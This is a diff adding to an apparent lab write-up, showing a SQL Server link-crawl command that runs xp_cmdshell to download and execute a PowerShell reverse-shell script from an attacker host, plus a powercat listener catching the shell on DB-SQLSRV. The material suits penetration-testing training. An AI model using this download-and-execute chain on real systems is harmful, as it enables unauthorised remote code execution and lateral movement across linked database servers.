@@ -390,3 +390,68 @@ User        : sa
 Links       :
 
 ```
+
+Using the same procedure for execute the previous reverse shell on the second specific targetlink db-sqlsrv:
+
+```
+PS C:\Users\studentuser17> Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c " iex(New-Object Net.webclient).DownloadString(\"http://192.168.100.17/Invoke-PowerShellTcpEx.ps1\");"''' -QueryTarget db-sqlsrv
+
+
+Version     : SQL Server 2017
+Instance    : US-MSSQL
+CustomQuery :
+Sysadmin    : 0
+Path        : {US-MSSQL}
+User        : US\studentuser17
+Links       : {192.168.23.25}
+
+Version     : SQL Server 2017
+Instance    : DB-SQLPROD
+CustomQuery :
+Sysadmin    : 1
+Path        : {US-MSSQL, 192.168.23.25}
+User        : dbuser
+Links       : {DB-SQLSRV}
+
+Version     : SQL Server 2017
+Instance    : DB-SQLSRV
+CustomQuery :
+Sysadmin    : 1
+Path        : {US-MSSQL, 192.168.23.25, DB-SQLSRV}
+User        : sa
+Links       :
+
+
+
+```
+
+
+```
+PS C:\AD\Tools> powercat -l -v -p 443 -t 1000
+VERBOSE: Set Stream 1: TCP
+VERBOSE: Set Stream 2: Console
+VERBOSE: Setting up Stream 1...
+VERBOSE: Listening on [0.0.0.0] (port 443)
+VERBOSE: Connection from [192.168.23.36] port  [tcp] accepted (source port 51054)
+VERBOSE: Setting up Stream 2...
+VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...
+Windows PowerShell running as user srvdba on DB-SQLSRV
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32>whoami
+db\srvdba
+PS C:\Windows\system32> hostname
+DB-SQLSrv
+PS C:\Windows\system32> ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet:
+
+   Connection-specific DNS Suffix  . :
+   Link-local IPv6 Address . . . . . : fe80::7ba0:c1c9:7f6e:e9ad%2
+   IPv4 Address. . . . . . . . . . . : 192.168.23.36
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.23.254
+```
